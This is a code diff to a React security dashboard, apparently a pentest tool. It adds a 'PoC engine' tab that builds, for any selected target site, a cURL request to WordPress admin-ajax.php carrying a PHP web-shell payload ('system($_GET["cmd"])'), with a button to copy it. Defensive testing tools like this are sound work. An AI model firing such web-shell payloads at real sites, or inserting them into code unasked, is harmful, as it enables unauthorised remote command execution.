@@ -93,16 +93,12 @@ const VULNERABILITIES = [
 ];
 
 // Helper Functions
-const isValidEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-
-const getPasswordStrength = (pass) => {
-  let score = 0;
-  if (pass.length >= 8) score++;
-  if (/[A-Z]/.test(pass)) score++;
-  if (/[a-z]/.test(pass)) score++;
-  if (/[0-9]/.test(pass)) score++;
-  if (/[^A-Za-z0-9]/.test(pass)) score++;
-  return score;
+const getDynamicPoc = (vulnId, targetUrl) => {
+  const cleanUrl = targetUrl ? targetUrl.replace(/\/$/, '') : 'https://example.com';
+  if (vulnId === 'vuln-1') {
+    return `curl -i -s -k -X POST '${cleanUrl}/wp-admin/admin-ajax.php' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'action=woocommerce_update_order_review&payload=<?php system($_GET["cmd"]); ?>'`;
+  }
+  return `curl -I -X GET '${cleanUrl}/' \\\n  -H 'User-Agent: SecurOps-Audit-Scanner/2.1'`;
 };
 
 export default function App() {
@@ -550,118 +546,127 @@ security_scan:
             </div>
           )}
 
-          {/* SCANNER & POC ENGINE TAB */}
-          {activeTab === 'scanner' && (
-            <div className="space-y-6 max-w-5xl mx-auto">
+{/* SCANNER & POC ENGINE TAB */}
+{activeTab === 'scanner' && (
+  <div className="space-y-6 max-w-5xl mx-auto">
+    
+    {/* Target Selector Bar */}
+    <div className="bg-[#111827] border border-slate-800 rounded-xl p-6 shadow-xl space-y-4">
+      <div className="flex flex-col sm:flex-row justify-between sm:items-center gap-4">
+        <div>
+          <h2 className="text-xl font-bold text-white">Automated Pentest & PoC Engine</h2>
+          <p className="text-xs text-slate-400">
+            Targeting: <span className="text-blue-400 font-mono font-semibold">{selectedSite.url}</span> ({selectedSite.name})
+          </p>
+        </div>
+
+        <div className="flex items-center gap-2">
+          <select 
+            value={selectedSite.id} 
+            onChange={(e) => setSelectedSite(sites.find(s => s.id === Number(e.target.value)))}
+            className="bg-[#1e293b] border border-slate-700 text-xs font-semibold text-white px-3 py-2 rounded-lg"
+          >
+            {sites.map(s => <option key={s.id} value={s.id}>{s.name}</option>)}
+          </select>
+
+          <button 
+            onClick={handleRunScan} 
+            disabled={isScanning}
+            className="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold rounded-lg flex items-center gap-2 transition disabled:opacity-50"
+          >
+            <RotateCw className={`w-3.5 h-3.5 ${isScanning ? 'animate-spin' : ''}`} /> 
+            {isScanning ? 'Scanning Target...' : 'Re-Run Scan'}
+          </button>
+        </div>
+      </div>
+    </div>
+
+    {/* Discovered Vulnerabilities */}
+    <div className="space-y-4">
+      <h3 className="text-base font-bold text-white flex items-center gap-2">
+        <ShieldAlert className="w-5 h-5 text-red-400" /> Discovered Vulnerabilities & PoC Exploits
+      </h3>
+
+      {VULNERABILITIES.map((vuln) => {
+        const isExpanded = expandedPoc === vuln.id;
+        const targetDomain = selectedSite?.url ? selectedSite.url.replace(/\/$/, '') : 'https://example.com';
+        
+        // Dynamically generated cURL payload based on target domain
+        const dynamicPocPayload = vuln.id === 'vuln-1'
+          ? `curl -i -s -k -X POST '${targetDomain}/wp-admin/admin-ajax.php' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'action=woocommerce_update_order_review&payload=<?php system($_GET["cmd"]); ?>'`
+          : `curl -I -X GET '${targetDomain}/' \\\n  -H 'User-Agent: SecurOps-Audit-Scanner/2.1'`;
+
+        return (
+          <div key={vuln.id} className="bg-[#111827] border border-slate-800 rounded-xl p-5 space-y-4 shadow-xl">
+            
+            <div className="flex items-start justify-between gap-4">
+              <div className="space-y-1">
+                <div className="flex items-center gap-2">
+                  <span className={`px-2.5 py-0.5 text-[10px] font-bold rounded border uppercase ${vuln.severity === 'Critical' ? 'bg-purple-500/20 text-purple-400 border-purple-500/30' : 'bg-red-500/20 text-red-400 border-red-500/30'}`}>
+                    CVSS {vuln.cvssScore} • {vuln.severity}
+                  </span>
+                  <span className="text-xs font-mono text-slate-400 bg-slate-900 px-2 py-0.5 rounded border border-slate-800">{vuln.cve}</span>
+                </div>
+                <h4 className="text-base font-bold text-white">{vuln.title}</h4>
+              </div>
               
-              {/* Target Selector & Scanner Action Bar */}
-              <div className="bg-[#111827] border border-slate-800 rounded-xl p-6 shadow-xl space-y-4">
-                <div className="flex flex-col sm:flex-row justify-between sm:items-center gap-4">
-                  <div>
-                    <h2 className="text-xl font-bold text-white">Automated Pentest & PoC Engine</h2>
-                    <p className="text-xs text-slate-400">Targeting: <span className="text-blue-400 font-mono font-semibold">{selectedSite.url}</span> ({selectedSite.name})</p>
-                  </div>
+              <button 
+                onClick={() => setExpandedPoc(isExpanded ? null : vuln.id)}
+                className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-blue-400 border border-slate-700 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition"
+              >
+                <Code2 className="w-4 h-4 text-blue-400" />
+                <span>{isExpanded ? 'Hide PoC Exploit' : 'Show PoC Payload'}</span>
+                {isExpanded ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
+              </button>
+            </div>
 
-                  <div className="flex items-center gap-2">
-                    <select 
-                      value={selectedSite.id} 
-                      onChange={(e) => setSelectedSite(sites.find(s => s.id === Number(e.target.value)))}
-                      className="bg-[#1e293b] border border-slate-700 text-xs font-semibold text-white px-3 py-2 rounded-lg"
-                    >
-                      {sites.map(s => <option key={s.id} value={s.id}>{s.name}</option>)}
-                    </select>
+            <p className="text-xs text-slate-300 leading-relaxed">{vuln.description}</p>
 
+            <div className="p-3 bg-[#1e293b]/40 border border-slate-800/80 rounded-lg text-xs text-slate-200">
+              <strong className="text-emerald-400 block mb-1">Recommended Patch / Remediation:</strong>
+              {vuln.remediation}
+            </div>
+
+            {/* EXPANDABLE POC EXPLOIT GENERATOR */}
+            {isExpanded && (
+              <div className="pt-4 border-t border-slate-800 space-y-4">
+                <div className="space-y-1.5">
+                  <h5 className="text-xs font-bold text-slate-300 flex items-center gap-1.5">
+                    <Terminal className="w-3.5 h-3.5 text-blue-400" /> Reproduction Guide:
+                  </h5>
+                  <ul className="space-y-1 text-xs text-slate-400 font-mono bg-slate-950/60 p-3 rounded-lg border border-slate-800">
+                    {vuln.reproSteps.map((step, idx) => (
+                      <li key={idx}>{step}</li>
+                    ))}
+                  </ul>
+                </div>
+
+                <div className="space-y-1.5">
+                  <div className="flex items-center justify-between text-xs text-slate-400">
+                    <span className="font-semibold text-white">cURL Exploit Request Payload:</span>
                     <button 
-                      onClick={handleRunScan} 
-                      disabled={isScanning}
-                      className="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold rounded-lg flex items-center gap-2 transition disabled:opacity-50"
+                      onClick={() => copyPocPayload(vuln.id, dynamicPocPayload)}
+                      className="flex items-center gap-1 text-blue-400 hover:text-blue-300 text-[11px] font-semibold"
                     >
-                      <RotateCw className={`w-3.5 h-3.5 ${isScanning ? 'animate-spin' : ''}`} /> 
-                      {isScanning ? 'Scanning Target...' : 'Re-Run Scan'}
+                      {copiedPocId === vuln.id ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
+                      {copiedPocId === vuln.id ? 'Copied Payload!' : 'Copy cURL Command'}
                     </button>
                   </div>
+                  
+                  <pre className="bg-[#080c14] p-4 rounded-lg border border-slate-800 text-[11px] font-mono text-emerald-400 overflow-x-auto leading-relaxed">
+                    {dynamicPocPayload}
+                  </pre>
                 </div>
               </div>
+            )}
 
-              {/* Findings & PoC Exploit Box */}
-              <div className="space-y-4">
-                <h3 className="text-base font-bold text-white flex items-center gap-2">
-                  <ShieldAlert className="w-5 h-5 text-red-400" /> Discovered Vulnerabilities & PoC Exploits
-                </h3>
+          </div>
+        );
+      })}
+    </div>
 
-                {VULNERABILITIES.map((vuln) => {
-                  const isExpanded = expandedPoc === vuln.id;
-                  return (
-                    <div key={vuln.id} className="bg-[#111827] border border-slate-800 rounded-xl p-5 space-y-4 shadow-xl">
-                      
-                      <div className="flex items-start justify-between gap-4">
-                        <div className="space-y-1">
-                          <div className="flex items-center gap-2">
-                            <span className={`px-2.5 py-0.5 text-[10px] font-bold rounded border uppercase ${vuln.severity === 'Critical' ? 'bg-purple-500/20 text-purple-400 border-purple-500/30' : 'bg-red-500/20 text-red-400 border-red-500/30'}`}>
-                              CVSS {vuln.cvssScore} • {vuln.severity}
-                            </span>
-                            <span className="text-xs font-mono text-slate-400 bg-slate-900 px-2 py-0.5 rounded border border-slate-800">{vuln.cve}</span>
-                          </div>
-                          <h4 className="text-base font-bold text-white">{vuln.title}</h4>
-                        </div>
-                        
-                        <button 
-                          onClick={() => setExpandedPoc(isExpanded ? null : vuln.id)}
-                          className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-blue-400 border border-slate-700 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition"
-                        >
-                          <Code2 className="w-4 h-4 text-blue-400" />
-                          <span>{isExpanded ? 'Hide PoC Exploit' : 'Show PoC Payload'}</span>
-                          {isExpanded ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
-                        </button>
-                      </div>
-
-                      <p className="text-xs text-slate-300 leading-relaxed">{vuln.description}</p>
-
-                      <div className="p-3 bg-[#1e293b]/40 border border-slate-800/80 rounded-lg text-xs text-slate-200">
-                        <strong className="text-emerald-400 block mb-1">Recommended Patch / Remediation:</strong>
-                        {vuln.remediation}
-                      </div>
-
-                      {/* EXPANDABLE POC EXPLOIT GENERATOR */}
-                      {isExpanded && (
-                        <div className="pt-4 border-t border-slate-800 space-y-4">
-                          <div className="space-y-1.5">
-                            <h5 className="text-xs font-bold text-slate-300 flex items-center gap-1.5">
-                              <Terminal className="w-3.5 h-3.5 text-blue-400" /> Reproduction Guide:
-                            </h5>
-                            <ul className="space-y-1 text-xs text-slate-400 font-mono bg-slate-950/60 p-3 rounded-lg border border-slate-800">
-                              {vuln.reproSteps.map((step, idx) => (
-                                <li key={idx}>{step}</li>
-                              ))}
-                            </ul>
-                          </div>
-
-                          <div className="space-y-1.5">
-                            <div className="flex items-center justify-between text-xs text-slate-400">
-                              <span className="font-semibold text-white">cURL Exploit Request Payload:</span>
-                              <button 
-                                onClick={() => copyPocPayload(vuln.id, vuln.pocPayload)}
-                                className="flex items-center gap-1 text-blue-400 hover:text-blue-300 text-[11px] font-semibold"
-                              >
-                                {copiedPocId === vuln.id ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
-                                {copiedPocId === vuln.id ? 'Copied Payload!' : 'Copy cURL Command'}
-                              </button>
-                            </div>
-                            
-                            <pre className="bg-[#080c14] p-4 rounded-lg border border-slate-800 text-[11px] font-mono text-emerald-400 overflow-x-auto leading-relaxed">
-                              {vuln.pocPayload}
-                            </pre>
-                          </div>
-                        </div>
-                      )}
-
-                    </div>
-                  );
-                })}
-              </div>
-
-            </div>
-          )}
+  </div>
+)}
 
           {/* CI/CD PIPELINE GENERATOR TAB */}
           {activeTab === 'cicd' && (
